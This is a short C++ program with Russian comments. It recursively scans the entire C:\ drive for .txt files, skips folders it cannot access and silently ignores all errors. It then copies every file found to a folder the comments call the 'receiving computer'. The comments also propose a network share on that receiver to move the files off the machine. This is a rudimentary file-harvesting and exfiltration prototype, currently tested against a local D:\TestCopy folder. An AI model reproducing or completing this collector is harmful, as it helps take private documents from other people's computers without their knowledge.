#include <iostream>
#include <filesystem>
#include <vector>

namespace fs = std::filesystem;

// Получение путей текстовых файлов, записывает всё в вектор
std::vector<fs::path> Find_files(const fs::path& Directory) 
{
    std::vector<fs::path> TXT_files;

    try 
    {
        if (fs::exists(Directory) && fs::is_directory(Directory)) 
            // Проход по всем директориям, с пропуском тех, к которым нет доступа. Запись файлов
            for (const auto& Entry : fs::recursive_directory_iterator(Directory, fs::directory_options::skip_permission_denied)) 
            {
                try
                {
                    if (Entry.is_regular_file() && Entry.path().extension() == ".txt")
                        TXT_files.push_back(Entry.path());
                }
                catch (const fs::filesystem_error& Er) 
                {
                }
            }
    }
    catch (const fs::filesystem_error& Er) 
    {
    }

    return TXT_files;
}


// Копирование файлов на компьютер-приемщик
void Copy_files(const std::vector<fs::path>& Files, const fs::path& Destination)
{
    try
    {
        for (const auto& File : Files)
        {
            try
            {
                // Создание пути к новому файлу в директории назначения
                fs::path New_file = Destination / File.filename();
                // Копирование файла
                fs::copy_file(File, New_file, fs::copy_options::overwrite_existing);
            }
            catch (const fs::filesystem_error& Er)
            {
            }
        }
    }
    catch (const fs::filesystem_error& Er)
    {
    }
}

int main() 
{
    // Вызов 
    fs::path Directory = "C:\\"; // Установка директории для поиска
    std::vector<fs::path> TXT_files = Find_files(Directory);

    // По части передачи данных не уверен максимально. По идее можно просто создать сетевую папку на приемщике и вписать её путь
    
    // Копирование на компьютер 
    fs::path Destination = "D:\\TestCopy"; // Путь, куда все копируется. Для теста всё работает
    Copy_files(TXT_files, Destination);

    return 0;
}
